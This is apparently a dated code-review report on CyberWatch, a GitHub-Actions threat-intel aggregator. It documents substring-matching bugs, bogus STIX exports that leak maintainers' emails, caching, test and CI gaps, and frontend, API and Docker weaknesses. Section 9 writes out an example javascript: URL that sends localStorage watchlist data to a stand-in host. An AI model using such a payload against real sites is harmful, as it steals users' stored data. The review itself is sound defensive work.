# CyberWatch — Code Analysis

**Repo:** `Cyberwatch-main` · **Analysed:** 2026-08-20 · ~7,500 LOC (Python 3.11 + vanilla JS)

Every finding below was verified against the code and, where possible, against the committed
`data/intel.json` and `data/exports/` produced by the live pipeline.

> ### ⚠ Historical: analysed at ~7,500 LOC, superseded by v4.0 (2026-08-26)
>
> Kept as the dated record it is. The tree is now ~13,000 LOC across 26 Python
> modules and four frontend files, and the findings here have been addressed.
> `ROADMAP.md` carries an appendix mapping what shipped; `README.md` describes
> the current design.
>
> Defects found *during* the v4 work — the ones a green suite did not catch —
> are listed in that appendix rather than here, because this document is a
> snapshot and not a running log.

---

## 1. What the system is

A zero-infrastructure threat-intel aggregator. GitHub Actions runs an hourly Python pipeline
that fans out to ~37 sources, normalises everything into one JSON document, and commits it
back to the repo; GitHub Pages serves a static vanilla-JS dashboard that reads that JSON.

```
37 sources ──▶ fetch_intel.main()
   (RSS x14, API x23)      │
                           ├─ deduplicate()          near-dupe collapse
                           ├─ map_ttps()             MITRE ATT&CK keyword mapping
                           ├─ fetch_epss_scores()    FIRST.org EPSS  (24h disk cache)
                           ├─ fetch_cisa_kev()       CISA KEV        (24h disk cache)
                           ├─ build_poc_map()        PoC-in-GitHub
                           ├─ detect_threat_actors() regex, word-boundary
                           ├─ compute_priority()     CVSS+EPSS+KEV+PoC → 0-100
                           ├─ mark_new_since_last()  diff vs previous archive
                           └─ enrich_with_ai()       rules for all, Gemini/Groq for top-N
                                     │
        ┌──────────────┬─────────────┼──────────────┬───────────────┐
    intel.json     archive/       exports/       trends.json    webhook alert
    (current)      YYYY-MM-DD     STIX/CSV/RSS   (30d rollup)   (Slack/Discord/…)
```

**Genuine strengths.** The failure isolation is well done — `run_source()` wraps every fetcher
so a dead feed degrades to a health record instead of aborting the run, and `source_health` is
surfaced in the UI. `_cached_fetch()` does atomic tmp→rename writes with stale-cache fallback.
`intel.json` is written atomically and *after* the archive, so a crash can't corrupt the live
file. `parse_ai_response()` has a genuinely thoughtful four-stage recovery ladder for
malformed LLM JSON. `config.py` centralises tuning with env overrides. The frontend routes
essentially all feed data through `escapeHTML()` and sets Mermaid to `securityLevel: 'strict'`.
This is a well-structured project; the problems below are concentrated in the *inference*
layer, not the plumbing.

---

## 2. Critical — substring matching corrupts severity, TTPs, and alerts

`infer_severity()` (`fetch_intel.py:1505`) and `map_ttps()` (`mitre_ttps.py`) both classify with
bare `if keyword in text`, no word boundaries. The keyword list includes `"rce"`, and `"rce"`
is a substring of **source**, **force**, **resource**, **enforcement**, **Salesforce**.

Measured against the committed `data/intel.json`:

| Effect | Count |
|---|---|
| Items marked `critical` **only** because `rce` matched inside another word | **16 of 51 (31%)** |
| `T1190 Exploit Public-Facing Application` assignments from the same cause | **19 of 37 (51%)** |

```python
>>> map_ttps("Salesforce data exposure")
[('T1190', 'Exploit Public-Facing Application')]
>>> map_ttps("a resource leak causes a crash")
[('T1190', 'Exploit Public-Facing Application')]
>>> map_ttps("authentication failure logged")     # "failure" contains "lure"
[('T1204', 'User Execution')]
```

Real items currently mis-scored `critical`: *"Graphing AWS Attack Paths in Bloodhound"*,
*"40 Malicious Firefox Extensions Pose as Web3 Products"*, *"BuildKit has a possible runtime DoS"*.

**Why this matters most:** `ALERT_SEVERITIES` defaults to `critical`, so these false positives are
exactly what gets pushed to Slack/Discord/Telegram. A third of your alerts are noise, which is
the failure mode that gets a security feed muted.

The fix pattern already exists in this codebase — `_ACTOR_PATTERNS` (`fetch_intel.py:1414`)
precompiles `(?<![0-9A-Za-z])kw(?![0-9A-Za-z])` precisely to stop `"apt"` matching `"adapter"`.
Apply the same treatment to `infer_severity`, `infer_category`, and `map_ttps`. For `map_ttps`,
a single precompiled alternation would also replace ~530k substring scans per run.

Related: 66 ATT&CK keywords are ≤5 chars (`ssp`, `lkm`, `vps`, `raas`, `dork`, `suid`, `chef`).
Some are hand-guarded with literal spaces (`' wmi '`, `' bec'`) — evidence the problem was
noticed but patched case-by-case rather than systematically. Note that space-padding also
fails at string boundaries and before punctuation.

---

## 3. Critical — the STIX/CSV exports are unusable and leak PII

`extract_iocs()` runs regexes over **article prose and advisory metadata**, not over curated
IOC feeds. `exports.py` then emits every match as a STIX `indicator` with
`"indicator_types": ["malicious-activity"]`.

Actual contents of the committed `data/exports/stix.json` (36 indicators total):

```
[domain-name:value = 'gmail.com']          ← labelled malicious-activity
[domain-name:value = 'redhat.com']
[domain-name:value = 'cern.ch']
[domain-name:value = 'isc.sans.edu']
[domain-name:value = 'handlers.ts']        ← a filename
[domain-name:value = 'req.query']          ← a code identifier
[domain-name:value = 'ops.dispatch']
[email-addr:value  = 'steve.traylen@cern.ch']    ← a Fedora packager
[email-addr:value  = 'jplesnik@redhat.com']      ← a Red Hat maintainer
```

Essentially 100% false positives. The one plausible domain, `malbearlabs.com`, is the
*reporting blog's own address*, pulled from the article link — the item's own `url` is never
excluded from IOC extraction.

Two distinct harms:

1. **Anyone importing this bundle into a TIP or blocklist blocks `gmail.com` and `redhat.com`.**
   The README markets these exports as SIEM/MISP-ready; they are actively dangerous.
2. **Named individuals' work email addresses are published in a git-committed file that labels
   them as malicious activity.** Fedora/Red Hat maintainers, hourly, in a public repo.

Recommended: extract IOCs only from sources that actually publish IOCs (URLhaus, ThreatFox,
Feodo, MalwareBazaar, OTX) rather than from every RSS description; and gate the rest behind a
defanging check (`[.]`, `hxxp`), a public-suffix-list validation for domains, and a denylist of
the item's own URL host plus common infrastructure domains. Defanged notation is the signal
that a string was *intended* as an IOC — `extract_iocs` already un-defangs at line 1549, so
that signal is available and currently discarded.

---

## 4. High — EPSS cache keys on the filename, not the CVE set

```python
# fetch_intel.py:1327
cached = _cached_fetch("epss.json", 24, lambda: _fetch_epss_raw(cve_ids))
```

The cache file is `epss.json` with a 24-hour TTL, but its *contents* are scores for whichever
`cve_ids` list was passed on the run that populated it. For the next 23 hourly runs, any newly
discovered CVE gets a cache hit on a payload that doesn't contain it, and silently receives no
EPSS score — which in turn drops it out of `compute_priority()`'s EPSS term.

Confirmed in the current data: **55 of 69 CVE-bearing items have an EPSS score**; 14 are missing.

Fix: key the cache per-CVE (`epss/<CVE-ID>.json`) or, simpler, fetch the full EPSS daily CSV
once per day into a lookup dict. Only the un-cached CVEs need a network round trip.

---

## 5. High — AI enrichment is effectively not running

`data/intel.json` shows `ai_provider` = `{'rule': 248, 'gemini': 3}`. Three of 251 items were
AI-enriched. Two compounding causes:

- `AI_ENRICH_LIMIT` defaults to **10** — a 4% ceiling by design, even on a perfect run.
- 7 of those 10 attempts failed. `enrich_with_ai()` (line 473) has no retry: one Gemini failure
  falls through to Groq, and if `GROQ_API_KEY` is unset (likely — 0 Groq items) the item keeps
  its rule-based summary. Failures are logged at INFO, so nobody notices.

The README leads with "AI Enrichment … writes detailed summaries, severity scores & Mermaid
attack graphs". At 3/251 that headline doesn't hold. Either raise the limit and add retry with
backoff, or reframe the feature honestly. Worth also emitting `ai_enriched_count` into
`intel.json` so the dashboard and CI summary can show the real number.

The sequential enrichment loop with `time.sleep(GROQ_SLEEP_SECS)` between items is also the
one un-parallelised phase left in an otherwise concurrent pipeline.

---

## 6. High — the same five functions exist in three divergent copies

| Function | `scripts/utils.py` | `scripts/fetch_intel.py` | `tests/test_pipeline.py` |
|---|---|---|---|
| `extract_cve_id` | `\d{4,}` | `\d{4,7}` | `\d{4,}` |
| `infer_severity` | ✓ | ✓ | ✓ |
| `infer_category` | ✓ | ✓ | ✓ |
| `extract_iocs` | 8 types, no defang | 9 types, defangs, filters private IPs | 3 types |
| `compute_priority` | `(cvss, epss, kev)`, weights hardcoded 40/40/20 | `(item)`, reads `CONFIG`, has PoC bonus | copy of `utils` version |

`utils.py`'s own docstring says *"imported by fetch_intel.py and tests"* — **neither imports it.**
It is dead code. And `tests/test_pipeline.py` doesn't import anything either: lines 13–88
re-implement the functions inside the test file and then test those copies.

**The 30 passing unit tests exercise zero lines of production code.** They would keep passing
if `fetch_intel.py` were deleted. Notably, the `rce`-substring bug in §2 is *reproduced
verbatim* in the test file's own `infer_severity`, and every severity test passes.

Fix: delete the duplicates, make `fetch_intel.py` import from `utils.py`, and make the tests
import the same module. Also note `config.priority_cvss_weight` / `_epss_weight` / `_kev_bonus`
are honoured only by the `fetch_intel` copy — the documented env-var overrides silently do
nothing for anything calling `utils.compute_priority`.

---

## 7. Medium — CI never runs the tests

`.github/workflows/` contains `update.yml` (hourly fetch+commit), `daily-digest.yml`, and
`source-health.yml`. Only `source-health.yml` runs unittest, and only
`tests/test_integration.py` with `RUN_LIVE_TESTS=1` — the live-reachability class. There is no
pull-request trigger, no lint, and `tests/test_pipeline.py` is never executed by any workflow.

Add a `pull_request` + `push` workflow running the full suite. (Given §6, also make the suite
worth running first.)

Smaller items in `update.yml`:
- Workflow is named **"Daily Intel Update"** but the cron is `0 */1 * * *` (hourly).
- Header comment says *"enriches top 15 items"*; `AI_ENRICH_LIMIT` default is 10.
- `fetch-depth: 0` clones full history every hour, and history grows by ~900 KB/run
  (`intel.json` + archive rewrite) plus an ever-growing `source_health_history.jsonl`
  (already 1.8 MB, appended and committed hourly, never truncated). This will get slow.
- Failure opens a **new GitHub issue every run** via `create-issue-action` — a sustained
  outage produces 24 issues/day. Consider searching for an open issue first.
- `git push` has no rebase/retry; a manual `workflow_dispatch` overlapping the cron will fail.

---

## 8. Medium — dedup order is nondeterministic

```python
def deduplicate(items):
    """... First occurrence wins, so the published-desc sort upstream keeps the newest copy."""
```

There is no upstream sort. In `main()`, items are appended by `_collect()` from an 8-worker
`ThreadPoolExecutor` in **thread-completion order**, `deduplicate()` runs, and *then*
`all_items.sort(key=published)` at line 1782. So which copy of a cross-source duplicate
survives depends on which HTTP request finished first — the authoritative NVD record and a
blog rewrite of it are equally likely to win, and the winner changes between runs.

Fix: move the `published`-descending sort above the `deduplicate()` call (which is what the
docstring already claims), or better, rank by source authority so NVD/CISA beat news rewrites.

Separately, `_normalize_title()` sorts a deduplicated token set, so *any two titles with the
same word bag collide* regardless of order — "Apache patch bypasses Windows fix" and "Windows
patch bypasses Apache fix" hash identically. Low frequency, but it silently drops real items.

---

## 9. Medium — frontend: `javascript:` URLs and one unescaped attribute

The dashboard is careful with `escapeHTML()` almost everywhere, but:

**`href` is escaped, not scheme-validated** (`app.js:537`, `:468`, `:910`):

```js
`<a href="${escapeHTML(item.url)}" target="_blank" rel="noopener">`
```

`escapeHTML` neutralises `<>"'&` but not `javascript:`. A feed item whose `url` is
`javascript:fetch('//x/'+localStorage.cw_watchlist)` becomes a working payload on click.
Reddit r/netsec and OTX pulses are the realistic injection points. Add a scheme allowlist:

```js
const safeUrl = u => /^https?:\/\//i.test(u || '') ? u : '#';
```

**One genuinely unescaped attribute** (`app.js:468`) — `item.poc_url` is interpolated raw into
a `title=""`:

```js
`<span class="poc-badge" title="Public PoC on GitHub${item.poc_url ? ': ' + item.poc_url : ''}">`
```

A `"` in `poc_url` breaks out of the attribute. Wrap in `escapeHTML()`. (`severityClass` at
`:920` is the same shape from NVD data — lower risk, same fix.)

**CSP contradicts the markup.** The meta CSP sets `script-src 'self' cdn.jsdelivr.net
platform.linkedin.com` with no `'unsafe-inline'`, yet the page ships three inline handlers
(`index.html:248` `onclick="closeCveModal()"`, `app.js:468` and `:538`
`onclick="event.stopPropagation()"`) and an inline `<script>` block at `index.html:272`. All
four are blocked. The comment at `app.js:1176` says delegation "replaces inline onclick for CSP
compliance" — the migration was left half-finished. Also: `X-Frame-Options` as a `<meta
http-equiv>` is ignored by all browsers; use `frame-ancestors` in the CSP (and real headers via
`nginx.conf`, which does set them correctly for the Docker path).

---

## 10. Medium — the service worker is broken on GitHub Pages

`service-worker.js` precaches absolute root paths:

```js
const PRECACHE = ["/", "/index.html", "/style.css", "/app.js", "/manifest.json"];
```

On `priyanshu965.github.io/Cyberwatch/` these resolve to the **user root**, not the project
subpath. `cache.addAll()` rejects on any 404, so `install` fails and the SW never activates —
i.e. no offline support at all, which is the entire point.

Compounding it, the fetch handler tests `url.pathname.startsWith("/data/")`, which never matches
`/Cyberwatch/data/intel.json`, so intel would take the `cacheFirst` path if it ever ran.

Use relative paths (`"./"`, `"./index.html"`, …) and match on `pathname.includes("/data/")`.

Also: **`sw.js` is dead code.** Only `service-worker.js` is registered (`app.js:1604`). Two
different service worker implementations sitting side by side is a trap for the next reader.

---

## 11. Medium — `rest_api.py` hardening

- **Unvalidated int parsing** (`:155`) — `?limit=abc` raises `ValueError` inside the handler,
  returning a 500 with a Python traceback. Wrap in `try/except`, clamp `limit` to a max.
- **`HTTPServer` is single-threaded** — one slow client blocks every other request. Use
  `ThreadingHTTPServer`.
- **Re-parses 430 KB of JSON on every request** despite sending `Cache-Control: max-age=60`.
  Cache the parsed dict against the file's mtime.
- **Defaults to `0.0.0.0` with `Access-Control-Allow-Origin: *`** — binds all interfaces out of
  the box. Default to `127.0.0.1`.
- **`/api/stats` reports a field that doesn't exist** (`:110`) — `exploits_available` counts
  `item.get("exploit_available")`, which the pipeline never sets. The real field is `has_poc`.
  It reports 0 forever.
- `/api/archive/:date` isn't traversable today (no percent-decoding, and `split("/")[-1]`
  discards `..` segments), but it's one refactor away from being so. Validate against
  `^\d{4}-\d{2}-\d{2}$`.

---

## 12. Medium — Docker packages the whole repo into the web root

```dockerfile
FROM nginx:alpine AS frontend
COPY . /usr/share/nginx/html
```

There is no `.dockerignore`. That copies `.git/`, `.github/`, `scripts/`, `tests/`, and ~40 MB
of `data/archive/` into a publicly-served directory. `nginx.conf` has no rule blocking dotfiles,
so `/.git/config` is reachable — and on a fork with committed history, `/.git/` is a full source
disclosure.

Add a `.dockerignore` (`.git`, `.github`, `scripts`, `tests`, `data/archive`, `__pycache__`) and
a `location ~ /\. { deny all; }` block.

Minor: `docker build -t cyberwatch .` with no `--target` builds only the *last* stage
(`fetcher`), so the README's Docker section can't produce the dashboard image. `docker-compose`
gets this right with explicit `target:`.

---

## 13. Lower-priority findings

**`webhook_post.py`**
- Email alerts are unreachable: `send_alerts()` returns early at line 209 if `config.webhook_url`
  is empty, so `WEBHOOK_TYPE=email` requires setting a dummy `WEBHOOK_URL`.
- Telegram payload posts `{"text", "parse_mode"}` with no `chat_id` — the Bot API requires it.
  This path cannot have been tested.
- `_alert_key()` claims to mirror `fetch_intel.item_key` but uses a raw lowercased URL instead
  of `_canonical_url()`. A tracking parameter appearing later re-alerts the same item.
- Slack `blocks` array is unbounded; Slack caps at 50 blocks. Safe at the default
  `ALERT_MAX_ITEMS=10`, breaks if anyone raises it past ~24.

**`daily_digest.py`**
- Digests *all* of `intel.json`, not "the last 24h" as the docstring says.
- The Slack footer builds a link from a **local filesystem path**:
  `f"<{CONFIG.output_path.parent}/index.html|Open Dashboard>"` renders as
  `</app/data/index.html|Open Dashboard>`. Should be the Pages URL.

**`config.py`**
- `ALERT_SEVERITIES` defaults to `"critical"`; the README documents `"critical,high"`.
- `PRIORITY_POC_BONUS` is documented nowhere in the README's config table.

**`compute_priority()` floors**
- `if poc: score = max(score, 70.0)` and `if kev: score = max(score, 90.0)` are hard floors, so
  a KEV entry with CVSS 3.1 and EPSS 0.001 outranks a non-KEV CVSS 9.8. That is defensible
  (KEV means confirmed exploitation) but it means CVSS and EPSS are decorative for KEV items —
  worth documenting, since the README presents it as a blended score.

**`mark_new_since_last()`**
- Compares against the newest archive snapshot *excluding today's*. On an hourly cadence that
  makes `is_new` mean "new since yesterday's last run", not "new since last run". Every run
  after the first each day re-flags the same items. The frontend badge says `NEW`.

**`clean_html()`** strips tags with `re.sub(r"<[^>]+>", "", text)`, which mangles descriptions
containing `<` in prose or code (`if (a < b)` loses everything to the next `>`).

---

## 14. Suggested order of work

| # | Item | § | Effort |
|---|---|---|---|
| 1 | Word-boundary matching in `infer_severity` / `infer_category` / `map_ttps` | 2 | S |
| 2 | Restrict IOC extraction to IOC-bearing sources; drop the PII/junk exports | 3 | M |
| 3 | Make tests import production code; delete the duplicated copies | 6 | M |
| 4 | Add a PR/push CI workflow that runs the suite | 7 | S |
| 5 | Per-CVE EPSS caching | 4 | S |
| 6 | `javascript:` scheme allowlist + escape `poc_url`; finish the CSP migration | 9 | S |
| 7 | Sort before `deduplicate()`, or rank by source authority | 8 | S |
| 8 | `.dockerignore` + nginx dotfile deny | 12 | S |
| 9 | Relative paths in the service worker; delete `sw.js` | 10 | S |
| 10 | `rest_api.py`: input validation, threading, response caching, localhost default | 11 | M |
| 11 | Raise/retry AI enrichment, or align the README with reality | 5 | M |
| 12 | Truncate/rotate `source_health_history.jsonl`; shallow-clone in CI | 7 | S |

Items 1–3 are the ones that change what the product actually reports. Everything else is
hygiene around a codebase that is, structurally, in good shape.
